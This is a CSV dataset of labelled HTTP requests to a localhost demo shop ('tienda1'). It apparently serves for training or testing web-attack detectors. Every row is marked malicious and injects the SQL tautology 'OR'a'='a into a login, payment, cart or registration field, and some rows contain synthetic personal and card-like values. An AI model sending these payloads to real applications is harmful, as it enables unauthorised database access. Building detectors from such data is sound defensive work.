method,url,protocol,headers,body,label,attack_type
POST,/tienda1/publico/caracteristicas.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=13F2BF1449A9CE562F88549A4EB00EFC', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 20'}",id=1%27OR%27a%3D%27a,malicious,sqli
GET,/tienda1/publico/entrar.jsp?errorMsg=%27OR%27a%3D%27a,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=D5DBF3DC93678E892E5633C64794DC71', 'Connection': 'close'}",,malicious,sqli
POST,/tienda1/publico/vaciar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=7ECDCEB2B12E2DC0B5DC21A8E85A2C83', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 33'}",B2=Vaciar+carrito%27OR%27a%3D%27a,malicious,sqli
POST,/tienda1/publico/autenticar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=EB0C065C96ABE333430483C95266C181', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 65'}",modo=entrar&login=galt&pwd=%27OR%27a%3D%27a&remember=on&B1=Entrar,malicious,sqli
POST,/tienda1/publico/pagar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=492E5209A20EC764DF484998F5C8375A', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 59'}",modo=insertar%27OR%27a%3D%27a&precio=5756&B1=Pasar+por+caja,malicious,sqli
POST,/tienda1/publico/vaciar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=3A1F765CDE73CC8C0225871F968785D7', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 19'}",B2=%27OR%27a%3D%27a,malicious,sqli
POST,/tienda1/publico/pagar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=B114B25412CCE4033798106B8E6AB02B', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 54'}",modo=insertar%27OR%27a%3D%27a&precio=3010&B1=Confirmar,malicious,sqli
GET,/tienda1/miembros/editar.jsp?modo=registro&login=ircbellc&password=c6ma2&nombre=Macarena&apellidos=Raynal+Santini&email=vesota%40autoescuelavilla.fm&dni=87351797M&direccion=Calle+Lachambre+Dominguez%2C+27%2C+13%3FD&ciudad=Alcal%E0+de+Xivert&cp=39212&provincia=Sevilla&ntc=9974355200418178&B1=%27OR%27a%3D%27a,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=B1CC9DC98FF0CB4631FC48C68FDEC1AE', 'Connection': 'close'}",,malicious,sqli
POST,/tienda1/publico/registro.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=67AD38AB8E8C385C225F0D05912B7D00', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 264'}",modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra%27OR%27a%3D%27a&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,malicious,sqli
POST,/tienda1/miembros/editar.jsp,http,"{'User-Agent': 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Encoding': 'x-gzip, x-deflate, gzip, deflate', 'Accept-Charset': 'utf-8, utf-8;q=0.5, *;q=0.5', 'Accept-Language': 'en', 'Host': 'localhost:8080', 'Cookie': 'JSESSIONID=908D43D2AFB652C2651F32DB0D323DC6', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'Connection: close', 'Content-Length': 'Content-Length: 244'}",modo=%27OR%27a%3D%27a&login=onfre&password=%24huaico&nombre=Stella&apellidos=Botella&email=pescard_praeger%40hipereuskadi.ms&dni=34934492E&direccion=Aguamarina+92%2C+6F&ciudad=Albal%E1&cp=42351&provincia=Le%F3n&ntc=0340155501114760&B1=Registrar,malicious,sqli
